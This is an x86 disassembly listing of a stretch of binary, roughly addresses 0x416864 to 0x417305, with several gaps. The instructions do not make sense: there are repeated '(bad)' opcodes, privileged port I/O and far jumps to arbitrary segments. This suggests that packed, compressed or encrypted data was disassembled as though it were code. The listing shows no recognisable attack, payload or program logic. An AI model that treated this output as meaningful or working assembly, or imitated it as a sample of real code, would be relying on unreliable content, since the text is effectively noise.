  416864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416865:	jo     0x416895
  416867:	das    
  416868:	ret    
  416869:	test   eax,0x5a80968
  41686e:	outs   dx,DWORD PTR ds:[esi]
  41686f:	mov    ebx,0xa3749e31
  416874:	ficomp WORD PTR [edi-0x5d]
  416877:	mov    edi,0x68a79a79
  41687c:	mov    dl,0x17
  41687e:	ret    
  41687f:	sti    
  416880:	dec    edx
  416881:	arpl   WORD PTR [eax+0x657a68a2],sp
  416887:	dec    edi
  416888:	ins    DWORD PTR es:[edi],dx
  416889:	mov    eax,0x3f311727
  41688e:	(bad)  
  41688f:	or     ah,BYTE PTR [edx-0x761d9c80]
  416895:	repnz cs std 
  416898:	dec    edx
  416899:	sub    al,0x45
  41689b:	pop    ds
  41689c:	loop   0x41689b
  41689e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41689f:	and    BYTE PTR [edi],dl
  4168a1:	mov    esp,0x3b389224
  4168a6:	js     0x4168e8
  4168a8:	push   0x957f160b
  4168ad:	jns    0x416898
  4168af:	mov    ebx,0xd4d52460
  4168b4:	sbb    BYTE PTR [ebp+0x12],ch
  4168b7:	pop    edx
  4168b8:	not    BYTE PTR [eax-0x10]
  4168bb:	or     edx,DWORD PTR [esi+0x37]
  4168be:	pop    ds
  4168bf:	cmp    eax,0xa7
	...
  416934:	inc    ebp
  416935:	mov    BYTE PTR [edi+esi*2],ch
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [esi-0x13],edx
  416942:	sub    dh,cl
  416944:	(bad)  
  416945:	test   BYTE PTR [eax],0x0
  416948:	cmc    
  416949:	add    BYTE PTR [eax],al
  41694b:	add    BYTE PTR [edx],al
  41694d:	push   es
  41694e:	pusha  
  41694f:	out    0xa8,al
  416951:	scas   al,BYTE PTR es:[edi]
  416952:	test   al,0x3c
  416954:	mov    al,ds:0xd577271d
  416959:	ins    DWORD PTR es:[edi],dx
  41695a:	sti    
  41695b:	les    edx,FWORD PTR [ebx-0x66]
  41695e:	fucomip st,st(0)
  416960:	test   BYTE PTR [edi+ebp*1+0x7ad6d7d1],0x43
  416968:	lods   eax,DWORD PTR ds:[esi]
  416969:	push   cs
  41696a:	add    eax,0x20f91177
  41696f:	jno    0x4169be
  416971:	mov    cl,0x62
  416973:	push   ss
  416974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416975:	mov    ds:0xbac4c016,al
  41697a:	cwde   
  41697b:	(bad)  
  41697c:	xor    eax,0x1d068b2a
  416981:	vpmaddwd xmm3,xmm6,XMMWORD PTR [edx+0x1f]
  416986:	cmp    ecx,DWORD PTR [ebx+eax*1-0x630a2d9e]
  41698d:	(bad)  
  41698e:	mov    al,ds:0x3a2d7788
  416993:	sti    
  416994:	daa    
  416995:	jns    0x41699a
  416997:	add    eax,0x354beea
  41699c:	push   ebx
  41699d:	dec    esi
  41699e:	jno    0x4169ee
  4169a0:	stos   BYTE PTR es:[edi],al
  4169a1:	dec    ecx
  4169a2:	mov    dh,BYTE PTR [edx-0x56b08779]
  4169a8:	pop    esp
  4169a9:	iret   
  4169aa:	call   0xd499a93a
  4169af:	fcomip st,st(3)
  4169b1:	imul   ebp,DWORD PTR [esi+0x34],0x1ea488a
  4169b8:	jbe    0x416964
  4169ba:	xor    al,0x11
  4169bc:	sahf   
  4169bd:	jo     0x4169a6
  4169bf:	int    0xc0
  4169c1:	fnstsw WORD PTR [ebx+0xd]
  4169c4:	xchg   esp,eax
  4169c5:	cmp    dh,BYTE PTR [edi-0x3e88d850]
  4169cb:	cmp    ah,BYTE PTR [ebp-0x58]
  4169ce:	push   esp
  4169cf:	inc    ecx
  4169d0:	xor    ch,BYTE PTR [eax+0x401d7a66]
  4169d6:	jbe    0x416979
  4169d8:	(bad)  
  4169d9:	mov    edi,0xde62f2b8
  4169de:	inc    ebp
  4169df:	push   ecx
  4169e0:	fisubr WORD PTR [ebx+0xd]
  4169e3:	pop    esi
  4169e4:	xchg   edx,eax
  4169e5:	pop    edx
  4169e6:	retf   0xac14
  4169e9:	int    0xad
  4169eb:	out    0x38,eax
  4169ed:	enter  0x6097,0x97
  4169f1:	jge    0x416a55
  4169f3:	pushf  
  4169f4:	inc    ecx
  4169f5:	loop   0x416a58
  4169f7:	lock inc ebx
  4169f9:	les    edi,FWORD PTR [ebx-0x235b7e1e]
  4169ff:	sub    al,0xbb
  416a01:	dec    edi
  416a02:	sub    al,0x86
  416a04:	mov    BYTE PTR [ebx-0x3a],0x70
  416a08:	push   es
  416a09:	xchg   edi,eax
  416a0a:	pop    ebp
  416a0b:	bound  esi,QWORD PTR [ecx-0x49]
  416a0e:	je     0x416a34
  416a10:	dec    esp
  416a11:	sub    edx,edi
  416a13:	stos   BYTE PTR es:[edi],al
  416a14:	and    eax,0x56f14f4a
  416a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a1a:	out    0x36,eax
  416a1c:	cmp    DWORD PTR [edx-0x41b68571],0x6
  416a23:	std    
  416a24:	mov    dl,0xc9
  416a26:	push   ebp
  416a27:	test   DWORD PTR [esi-0x23],edx
  416a2a:	inc    eax
  416a2b:	stos   DWORD PTR es:[edi],eax
  416a2c:	sub    al,0x43
  416a2e:	ins    BYTE PTR es:[edi],dx
  416a2f:	cs xchg edi,eax
  416a31:	mov    edx,esp
  416a33:	call   0xd6d32f74
  416a38:	and    DWORD PTR [eax-0x7472c994],0xffffffa7
  416a3f:	lods   al,BYTE PTR ss:[esi]
	...
  416ab1:	add    BYTE PTR [eax],al
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx+0x1c6af852]
  416ac3:	mov    ecx,0xf7bb
  416ac8:	cmc    
  416ac9:	add    BYTE PTR [eax],al
  416acb:	add    BYTE PTR [ecx+0x41e2b388],al
  416ad1:	push   0xffffffdf
  416ad3:	sub    DWORD PTR [esi+eax*8+0x7dcc56be],esp
  416ada:	or     eax,0x4e83e197
  416adf:	jecxz  0x416ae0
  416ae1:	sub    BYTE PTR [ecx],bh
  416ae3:	mov    esp,0x5fcf1502
  416ae8:	mov    bh,0x94
  416aea:	jno    0x416b15
  416aec:	push   eax
  416aed:	push   0x61
  416aef:	lea    eax,[edx-0x54d1f161]
  416af5:	xor    esi,DWORD PTR [ebx-0x6]
  416af8:	xor    al,0x5
  416afa:	hlt    
  416afb:	out    dx,eax
  416afc:	out    0x2a,al
  416afe:	and    eax,0x4117cf62
  416b03:	xchg   esi,eax
  416b04:	pushf  
  416b05:	jb     0x416aa0
  416b07:	in     eax,dx
  416b08:	inc    DWORD PTR [esi]
  416b0a:	and    esi,eax
  416b0c:	outs   dx,BYTE PTR ds:[esi]
  416b0d:	mov    esi,0xd8ed1c20
  416b12:	add    DWORD PTR [ebp-0x1d],eax
  416b15:	jmp    0x55ec:0x9775d868
  416b1c:	jbe    0x416af6
  416b1e:	div    DWORD PTR [eax+0xc]
  416b21:	pop    ebp
  416b22:	mov    gs,WORD PTR [edx]
  416b24:	(bad)  
  416b25:	xchg   edx,eax
  416b26:	fcomi  st,st(5)
  416b28:	xchg   ebx,eax
  416b29:	and    edi,esp
  416b2b:	or     eax,0x4451d839
  416b30:	push   0xbeff0700
  416b35:	lods   eax,DWORD PTR es:[esi]
  416b37:	push   ds
  416b38:	std    
  416b39:	jmp    0xd73d:0xc4514ce8
  416b40:	cmp    bl,BYTE PTR [ecx+ebp*4-0x4cb1f93a]
  416b47:	mov    es:0x3afe5fa3,al
  416b4d:	stos   BYTE PTR es:[edi],al
  416b4e:	popaw  
  416b50:	std    
  416b51:	loope  0x416b14
  416b53:	sti    
  416b54:	dec    ebp
  416b55:	es leave 
  416b57:	shr    BYTE PTR [edi],cl
  416b59:	js     0x416b69
  416b5b:	sbb    eax,0xe3db3d06
  416b60:	loop   0x416bad
  416b62:	dec    edx
  416b63:	cli    
  416b64:	add    eax,DWORD PTR [esp+eax*2-0x629090ee]
  416b6b:	inc    ecx
  416b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b6d:	ja     0x416b5c
  416b6f:	mov    ah,0xd0
  416b71:	hlt    
  416b72:	ret    
  416b73:	cs retf 0xd81b
  416b77:	pop    ss
  416b78:	push   edi
  416b79:	inc    edx
  416b7a:	dec    esi
  416b7b:	add    dh,cl
  416b7d:	push   ebp
  416b7e:	das    
  416b7f:	dec    ebp
  416b80:	and    al,0xbd
  416b82:	lock pop ebp
  416b84:	nop
  416b85:	pushf  
  416b86:	shl    BYTE PTR [ebx-0x41],0x54
  416b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b8b:	dec    esp
  416b8c:	dec    edi
  416b8d:	(bad)  
  416b8e:	xor    al,0x7e
  416b90:	fidivr WORD PTR [edi-0x5]
  416b93:	xor    al,0xc6
  416b95:	bound  eax,QWORD PTR [ebp+0x74978c7f]
  416b9b:	inc    ebx
  416b9c:	jmp    0xb48e4cb
  416ba1:	pop    esi
  416ba2:	retf   
  416ba3:	icebp  
  416ba4:	mov    BYTE PTR [esi+0x771300eb],ah
  416baa:	pop    ebx
  416bab:	jecxz  0x416b3b
  416bad:	and    esi,DWORD PTR [eax]
  416baf:	mov    bl,0x40
  416bb1:	dec    eax
  416bb2:	sbb    eax,0x35f0d55a
  416bb7:	pop    eax
  416bb8:	add    al,0x2f
  416bba:	icebp  
  416bbb:	push   ecx
  416bbc:	(bad)  ds:0x282be9
	...
  416c32:	add    BYTE PTR [eax],al
  416c34:	cmp    dl,BYTE PTR [eax]
  416c36:	mov    edi,0xbbbfbf3c
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    eax,DWORD PTR [edi-0x4f920083]
  416c45:	clc    
  416c46:	add    BYTE PTR [eax],al
  416c48:	cmc    
  416c49:	add    BYTE PTR [eax],al
  416c4b:	add    dh,dl
  416c4d:	std    
  416c4e:	test   al,0xa8
  416c50:	xor    dh,BYTE PTR ss:[edi-0x2]
  416c54:	jle    0x416c38
  416c56:	(bad)  
  416c57:	cmp    dh,BYTE PTR [ebx+0x2f]
  416c5a:	icebp  
  416c5b:	fcom   DWORD PTR [edi-0x7e51dfae]
  416c61:	mov    eax,0x8d1a9d2e
  416c66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c67:	in     al,dx
  416c68:	adc    BYTE PTR [edx],ah
  416c6a:	ficomp WORD PTR [ecx]
  416c6c:	lock dec ecx
  416c6e:	mov    ds:0xaaec787e,al
  416c73:	and    DWORD PTR [ebx+0x69827dee],edx
  416c79:	push   ebp
  416c7a:	push   ecx
  416c7b:	push   ss
  416c7c:	outs   dx,DWORD PTR ds:[esi]
  416c7d:	mov    ch,0x20
  416c7f:	lock es xor eax,esi
  416c83:	xchg   BYTE PTR [ebp+0x22],dl
  416c86:	mov    cl,0x88
  416c88:	push   ss
  416c89:	in     al,0xf9
  416c8b:	neg    BYTE PTR [esp+eax*1]
  416c8e:	sbb    ecx,0x59c30ab6
  416c94:	fisttp DWORD PTR [edi-0x73]
  416c97:	jecxz  0x416cfb
  416c99:	in     eax,0xc6
  416c9b:	loopne 0x416ce4
  416c9d:	and    ah,BYTE PTR [ebx]
  416c9f:	loop   0x416c6f
  416ca1:	fsubr  QWORD PTR [esi-0x3ae1efdb]
  416ca7:	je     0x416d27
  416ca9:	xchg   DWORD PTR [ebp-0x496f9356],ebx
  416caf:	lods   eax,DWORD PTR ds:[esi]
  416cb0:	xor    eax,0x2baba0e
  416cb5:	and    al,0xab
  416cb7:	fwait
  416cb8:	mov    ah,BYTE PTR [eax+eiz*2-0x11]
  416cbc:	jecxz  0x416d16
  416cbe:	loopne 0x416d20
  416cc0:	pop    eax
  416cc1:	outs   dx,DWORD PTR ds:[esi]
  416cc2:	push   ss
  416cc3:	cli    
  416cc4:	enter  0xaf15,0x64
  416cc8:	xchg   ebp,eax
  416cc9:	das    
  416cca:	mov    bh,0xb1
  416ccc:	jns    0x416c60
  416cce:	sbb    al,0x1b
  416cd0:	add    eax,0x6775a4b5
  416cd5:	push   eax
  416cd6:	rol    DWORD PTR [ecx+eax*2-0x31470fb1],cl
  416cdd:	popa   
  416cde:	lock pop esi
  416ce0:	sub    BYTE PTR [ecx],bh
  416ce2:	loopne 0x416d04
  416ce4:	icebp  
  416ce5:	in     al,0xe
  416ce7:	clc    
  416ce8:	clc    
  416ce9:	(bad)  
  416ceb:	hlt    
  416cec:	xchg   ecx,eax
  416ced:	or     BYTE PTR [edx],dl
  416cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cf0:	adc    eax,0x6423b14
  416cf5:	mov    edi,0xc5253884
  416cfa:	lds    ebp,FWORD PTR [edi+ebx*8]
  416cfd:	rol    BYTE PTR [eax],cl
  416cff:	fisub  DWORD PTR [esi-0x269ebd66]
  416d05:	nop
  416d06:	pop    esp
  416d07:	jbe    0x416d25
  416d09:	mov    ebp,0xd4432cd8
  416d0e:	iret   
  416d0f:	and    DWORD PTR [ebx+edx*8-0x73ea00f8],ecx
  416d16:	inc    ebx
  416d17:	into   
  416d18:	xchg   edx,eax
  416d19:	cmc    
  416d1a:	aaa    
  416d1b:	iret   
  416d1c:	mov    ds:0xe4698503,al
  416d21:	idiv   BYTE PTR [esp+esi*1]
  416d24:	xchg   DWORD PTR gs:[ecx-0x17],esp
  416d28:	dec    esp
  416d29:	aas    
  416d2a:	add    ebp,edx
  416d2c:	add    DWORD PTR [eax-0x67fa357f],ebx
  416d32:	or     ebx,ecx
  416d34:	xchg   ebx,eax
  416d35:	jmp    0x40384176
  416d3a:	inc    ebp
  416d3b:	neg    BYTE PTR [eax+0x17]
  416d3e:	push   eax
  416d3f:	shl    DWORD PTR [eax+eax*1+0x0],0x0
	...
  416db3:	add    dh,ch
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0xe16d99b5
  416dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dc5:	stc    
  416dc6:	add    BYTE PTR [eax],al
  416dc8:	cmc    
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    BYTE PTR [esi-0x5d5650ae],ah
  416dd1:	arpl   dx,sp
  416dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dd4:	(bad)  
  416dd5:	jmp    0x5ca9:0x81600087
  416ddc:	aas    
  416ddd:	xchg   esp,eax
  416dde:	cs fwait
  416de0:	sbb    DWORD PTR [edx],esi
  416de2:	cmp    ecx,edi
  416de4:	mov    dl,0xab
  416de6:	fs mov bl,0x33
  416de9:	add    dl,0xd7
  416dec:	cmp    DWORD PTR [ebx],ecx
  416dee:	xor    edx,DWORD PTR [eax-0x49c8352f]
  416df4:	inc    esi
  416df5:	push   0xffa36551
  416dfa:	daa    
  416dfb:	cmp    bh,BYTE PTR [ecx-0x38]
  416dfe:	adc    DWORD PTR [ebx-0x2e],edx
  416e01:	jp     0x416e58
  416e03:	jmp    0x10b2:0xe41c6331
  416e0a:	dec    esi
  416e0b:	and    al,0xa9
  416e0d:	(bad)  
  416e0e:	mov    ebx,DWORD PTR [edi]
  416e10:	hlt    
  416e11:	push   ecx
  416e12:	jbe    0x416e26
  416e14:	or     eax,0x525f6f86
  416e19:	sbb    edx,DWORD PTR [esi+0x6c]
  416e1c:	adc    al,0xaf
  416e1e:	lock push ecx
  416e20:	pop    esp
  416e21:	ins    BYTE PTR es:[edi],dx
  416e22:	out    dx,al
  416e23:	inc    esp
  416e24:	push   0x35
  416e26:	shr    DWORD PTR [ecx-0x5b427c9f],0xfc
  416e2d:	sbb    esi,DWORD PTR [eax-0x32]
  416e30:	pop    ebx
  416e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e32:	int3   
  416e33:	retf   
  416e34:	or     DWORD PTR [ecx],ecx
  416e36:	pusha  
  416e37:	mov    ebp,0x127a8c2
  416e3d:	cmp    cl,bh
  416e3f:	inc    esp
  416e40:	sar    BYTE PTR [esi+ebp*4],0xc5
  416e44:	jg     0x416e18
  416e46:	jmp    0x416ec1
  416e48:	fisttp DWORD PTR [esp+ebx*1+0x7de9a0d8]
  416e4f:	cwde   
  416e50:	cmp    bh,BYTE PTR [esi+0x55dc6b2a]
  416e56:	clc    
  416e57:	jo     0x416e5d
  416e59:	push   0x29
  416e5b:	xor    eax,DWORD PTR [eax-0x11]
  416e5e:	mov    ebx,DWORD PTR [ecx+0x3eb420de]
  416e64:	loop   0x416e7e
  416e66:	pop    edx
  416e67:	mov    ds:0x144fabe4,al
  416e6c:	xchg   esi,eax
  416e6d:	cld    
  416e6e:	icebp  
  416e6f:	fimul  WORD PTR [esi]
  416e71:	call   0x729405a7
  416e76:	inc    ecx
  416e77:	or     DWORD PTR [ebp+0x3b],ecx
  416e7a:	lahf   
  416e7b:	xor    al,BYTE PTR [ebx+edi*2-0x16]
  416e7f:	in     eax,0x93
  416e81:	or     DWORD PTR [eax],ebp
  416e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e84:	call   0x19a9:0x591a6243
  416e8b:	repnz pop ss
  416e8d:	mov    ebp,0x55efe043
  416e92:	mov    ah,0x1a
  416e94:	jecxz  0x416ee3
  416e96:	jnp    0x416e9f
  416e98:	sub    edx,DWORD PTR [ecx-0x2a]
  416e9b:	add    BYTE PTR [eax],al
  416e9d:	out    dx,eax
  416e9e:	cli    
  416e9f:	or     al,0xb1
  416ea1:	(bad)
  416ea5:	fbstp  TBYTE PTR [esi-0x76c4ecdd]
  416eab:	test   al,0x4f
  416ead:	xchg   esi,eax
  416eae:	repz xchg edx,eax
  416eb0:	push   0x6f
  416eb2:	xor    bh,BYTE PTR [ebx-0x26b2d270]
  416eb8:	(bad)  
  416eb9:	mov    bl,BYTE PTR [edx+esi*8]
  416ebc:	fadd   DWORD PTR [edi-0x13]
  416ebf:	push   ds
  416ec0:	in     al,0x0
	...
  416f32:	add    BYTE PTR [eax],al
  416f34:	pop    ss
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	aaa    
  416f41:	pop    ecx
  416f42:	stc    
  416f43:	js     0x416edf
  416f45:	cli    
  416f46:	add    BYTE PTR [eax],al
  416f48:	cmc    
  416f49:	add    BYTE PTR [eax],al
  416f4b:	add    BYTE PTR [edx+0x5a],dl
  416f4e:	xor    BYTE PTR [esi+0x34],cl
  416f51:	outs   dx,BYTE PTR ds:[esi]
  416f52:	pop    eax
  416f53:	ja     0x416fad
  416f55:	jae    0x416f37
  416f57:	nop
  416f58:	push   ds
  416f59:	xor    al,0x46
  416f5b:	inc    ah
  416f5d:	xchg   dh,bh
  416f5f:	dec    DWORD PTR [ebx-0x6bba9a4]
  416f65:	jb     0x416fc5
  416f67:	sub    DWORD PTR ds:0xe5c58a8d,ebx
  416f6d:	not    BYTE PTR [ebp-0x762f1d27]
  416f73:	push   eax
  416f74:	(bad)
  416f77:	fmul   QWORD PTR [ebx+edx*1-0x67bb3118]
  416f7e:	push   ebp
  416f7f:	ret    
  416f80:	adc    al,0xe3
  416f82:	mov    edx,0x6bd75743
  416f87:	lods   al,BYTE PTR ds:[esi]
  416f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f89:	push   0xe6629919
  416f8e:	ds nop
  416f90:	popa   
  416f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f92:	enter  0x43f0,0x57
  416f96:	sbb    BYTE PTR [ecx],bl
  416f98:	imul   esi,DWORD PTR [eax+edx*4-0x42085e8f],0x54
  416fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fa1:	jmp    0x733b:0x158c95e3
  416fa8:	repz sbb BYTE PTR [bx+si+0x34],bh
  416fad:	push   0x27
  416faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fb0:	(bad)  
  416fb1:	cmc    
  416fb2:	pushfw 
  416fb4:	mov    cl,0x5a
  416fb6:	nop
  416fb7:	fcom   QWORD PTR [edx]
  416fb9:	loopne 0x416fdb
  416fbb:	(bad)  
  416fbc:	std    
  416fbd:	mov    al,ds:0x5a029524
  416fc2:	bnd jns 0x41700d
  416fc5:	cmp    al,BYTE PTR [edi-0x4e794c2d]
  416fcb:	scas   eax,DWORD PTR es:[edi]
  416fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fcd:	and    al,0xce
  416fcf:	jle    0x416fcc
  416fd1:	in     al,0x28
  416fd3:	or     al,0xfc
  416fd5:	and    DWORD PTR [edi+0x4e],ebx
  416fd8:	xchg   ebp,eax
  416fd9:	cmp    bl,ch
  416fdb:	push   ebx
  416fdc:	push   ebp
  416fdd:	pop    esp
  416fde:	outs   dx,DWORD PTR ds:[esi]
  416fdf:	jns    0x416fa9
  416fe1:	xlat   BYTE PTR ds:[ebx]
  416fe2:	ucomiss xmm2,DWORD PTR [edi-0x20]
  416fe6:	(bad)  
  416fe7:	icebp  
  416fe8:	xchg   edi,eax
  416fe9:	push   ss
  416fea:	rcl    DWORD PTR ds:0x7a95b3f7,cl
  416ff0:	sub    BYTE PTR [ecx+0xc],0xd7
  416ff4:	and    ch,BYTE PTR [eax+ecx*2]
  416ff7:	sub    DWORD PTR [eax],esp
  416ff9:	xor    DWORD PTR [edi+0x5c9a440],ecx
  416fff:	je     0x416f99
  417001:	fmulp  st(6),st
  417003:	xlat   BYTE PTR ds:[ebx]
  417004:	std    
  417005:	adc    al,ch
  417007:	sbb    BYTE PTR [edx+0x7c6c25ed],0xf6
  41700e:	rcr    BYTE PTR [edx+0x75f8d089],1
  417014:	mov    dh,0x57
  417016:	mov    al,ds:0xbb873ace
  41701b:	sbb    eax,0xc83b57be
  417020:	neg    BYTE PTR ds:0x6d34272a
  417026:	mov    WORD PTR [eax],fs
  417028:	int3   
  417029:	or     BYTE PTR ds:[edi+0x51],bh
  41702d:	pop    eax
  41702e:	jo     0x41708c
  417030:	or     DWORD PTR es:0x6f7346ec,ebp
  417037:	fdiv   DWORD PTR fs:[esi+0x26]
  41703b:	mov    dh,0x56
  41703d:	loope  0x416fc9
  41703f:	mov    bl,0x91
	...
  4170b1:	add    BYTE PTR [eax],al
  4170b3:	add    BYTE PTR [eax],ah
  4170b5:	jmp    0xdf3d4ef5
  4170ba:	in     eax,0xff
  4170bc:	dec    ecx
  4170bd:	dec    ecx
  4170be:	ret    
  4170bf:	sub    DWORD PTR [ebp-0x71],0x70
  4170c3:	mov    eax,ds:0xfb8f
  4170c8:	cmc    
  4170c9:	add    BYTE PTR [eax],al
  4170cb:	add    BYTE PTR [esi+eax*2-0x2a45620a],ah
  4170d2:	mov    eax,ds:0x5c28912c
  4170d7:	pushf  
  4170d8:	mov    DWORD PTR [eax+esi*4+0x30deb4d3],eax
  4170df:	mov    al,0x6e
  4170e1:	dec    ebp
  4170e2:	sahf   
  4170e3:	inc    esp
  4170e4:	call   0xd311:0x775c64d3
  4170eb:	out    0x1f,eax
  4170ed:	(bad)  
  4170ee:	enter  0x66d7,0xd3
  4170f2:	or     DWORD PTR [ebp+0x24],esi
  4170f5:	cli    
  4170f6:	lods   eax,DWORD PTR ds:[esi]
  4170f7:	scas   al,BYTE PTR es:[edi]
  4170f8:	mov    edx,0xf3bfde3b
  4170fd:	add    DWORD PTR ds:0xa4af4556,esi
  417103:	add    esp,DWORD PTR [edx+ebp*1]
  417106:	in     al,0x18
  417108:	push   esp
  417109:	add    bl,bl
  41710b:	inc    edi
  41710c:	mov    BYTE PTR [edi],bl
  41710e:	out    dx,eax
  41710f:	(bad)  
  417110:	sub    BYTE PTR [eax],bl
  417112:	clc    
  417113:	mov    bl,0x9d
  417115:	jbe    0x41717b
  417117:	loope  0x41712d
  417119:	dec    edi
  41711a:	sub    BYTE PTR [ecx+eiz*4],bl
  41711d:	or     DWORD PTR [edx-0x70c76cb0],0x3eb652c7
  417127:	push   esp
  417128:	push   ebp
  417129:	jle    0x41716b
  41712b:	mov    esp,0x997fa163
  417130:	fmul   DWORD PTR [ebp-0x80]
  417133:	pop    esp
  417134:	xor    DWORD PTR [ebx+ebx*4-0x794ff3de],ebp
  41713b:	fbstp  TBYTE PTR [ebx+0x11]
  41713e:	out    dx,al
  41713f:	jle    0x417147
  417141:	mov    esp,DWORD PTR [eax]
  417143:	sahf   
  417144:	ja     0x417191
  417146:	pop    ss
  417147:	inc    ebp
  417148:	ins    BYTE PTR es:[edi],dx
  417149:	mul    DWORD PTR [eax]
  41714b:	jl     0x4171c8
  41714d:	mov    ecx,0x9aead60e
  417152:	inc    esi
  417153:	jne    0x4171a6
  417155:	cld    
  417156:	loop   0x4171a1
  417158:	sub    al,0x47
  41715a:	xor    al,0x21
  41715c:	adc    eax,ecx
  41715e:	(bad)  
  41715f:	in     al,0x68
  417161:	ins    DWORD PTR es:[edi],dx
  417162:	fwait
  417163:	push   esi
  417164:	pop    ecx
  417165:	adc    eax,0xaeb071e6
  41716a:	jl     0x4171d6
  41716c:	mov    al,ds:0xc568ff76
  417171:	mov    ebx,0x43c9dc50
  417176:	cdq    
  417177:	in     al,0x7b
  417179:	adc    ecx,DWORD PTR [esp+esi*4+0x6c]
  41717d:	and    DWORD PTR [ecx+0x4ab2d72b],edx
  417183:	(bad)  
  417184:	sub    BYTE PTR [eax],al
  417186:	aam    0xf5
  417188:	loopne 0x41719d
  41718a:	xchg   ebx,eax
  41718b:	xchg   DWORD PTR [ebx-0x445d0cdc],esp
  417191:	ins    DWORD PTR es:[edi],dx
  417192:	push   esp
  417194:	daa    
  417195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417196:	ss jecxz 0x417139
  417199:	push   ebp
  41719a:	popf   
  41719b:	adc    BYTE PTR ds:0x6cea4cdb,dl
  4171a1:	hlt    
  4171a2:	outs   dx,BYTE PTR ds:[esi]
  4171a3:	into   
  4171a4:	(bad)
  4171a8:	and    dl,BYTE PTR [ebp-0x1e4a1fa9]
  4171ae:	dec    ebx
  4171af:	pop    eax
  4171b0:	inc    DWORD PTR [esi+eiz*2+0x8f8157e]
  4171b7:	sub    al,0xff
  4171b9:	sub    ebx,esp
  4171bb:	scas   al,BYTE PTR es:[edi]
  4171bc:	test   DWORD PTR [eax-0x56],edi
  4171bf:	cli    
  4171c0:	add    DWORD PTR [eax],0x0
	...
  417232:	add    BYTE PTR [eax],al
  417234:	and    ebp,DWORD PTR [esi+0x32]
  417237:	and    eax,0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	pop    di
  417241:	fucomi st,st(0)
  417243:	xor    al,BYTE PTR [esp+edi*8+0xf50000]
  41724a:	add    BYTE PTR [eax],al
  41724c:	jp     0x41725e
  41724e:	clc    
  41724f:	jecxz  0x41723a
  417251:	retf   0x1b4e
  417254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417255:	pop    ds
  417256:	pusha  
  417257:	pop    ebp
  417258:	and    eax,0x357e7799
  41725d:	in     eax,dx
  41725e:	jns    0x417253
  417260:	call   0x78ee:0xe21ab59d
  417267:	mov    es,edi
  417269:	sbb    al,dh
  41726b:	xor    DWORD PTR es:[eax],ebp
  41726e:	call   0x776e:0x32aac163
  417275:	cmp    al,0x4d
  417277:	dec    esp
  417278:	mov    edx,0xc1a530ca
  41727d:	add    ebp,eax
  41727f:	sub    BYTE PTR [ecx*8+0x7adb9e9a],dl
  417286:	scas   al,BYTE PTR es:[edi]
  417287:	sbb    al,0x9b
  417289:	mov    dh,0x23
  41728b:	je     0x417212
  41728d:	fmul   QWORD PTR [esi+0x14]
  417290:	jmp    0x7b64:0x945c083d
  417297:	into   
  417298:	fcomp  QWORD PTR [edi]
  41729a:	aam    0x1e
  41729c:	add    al,0xc3
  41729e:	pop    ebp
  41729f:	jecxz  0x4172e0
  4172a1:	loope  0x417299
  4172a3:	sub    BYTE PTR [ecx],0x97
  4172a6:	jg     0x4172a9
  4172a8:	into   
  4172a9:	sub    cl,bl
  4172ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172ac:	scas   al,BYTE PTR es:[edi]
  4172ad:	repnz or al,0x9a
  4172b0:	sbb    DWORD PTR [eax+0x1d8238b1],edi
  4172b6:	mov    eax,ds:0x8e9b4c45
  4172bb:	je     0x417321
  4172bd:	test   eax,0xd138167c
  4172c2:	xor    al,BYTE PTR [ebp+0x99e8ea]
  4172c8:	rol    al,0x91
  4172cb:	mov    cl,0xd6
  4172cd:	retf   
  4172ce:	and    ah,BYTE PTR [ebp+0x4e]
  4172d1:	(bad)  
  4172d2:	pop    ss
  4172d3:	xor    eax,0x206f96b9
  4172d8:	pop    ebx
  4172d9:	sbb    ch,BYTE PTR [edi+0x26ce03]
  4172df:	jmp    0x41728f
  4172e1:	adc    dl,BYTE PTR [edx+0x6a]
  4172e4:	adc    BYTE PTR [edi],cl
  4172e6:	mov    WORD PTR ds:0x3d38a451,ds
  4172ec:	lock mov BYTE PTR [esi-0xc],al
  4172f0:	sar    DWORD PTR [edi+0x14f8a781],1
  4172f6:	mov    edi,ss
  4172f8:	adc    DWORD PTR [ebx+0x52],eax
  4172fb:	xor    esp,ecx
  4172fd:	lods   al,BYTE PTR ds:[esi]
  4172fe:	jle    0x41735e
  417300:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417302:	mov    esi,DWORD PTR [ebp-0x39]
  417305:	jae    0x417305
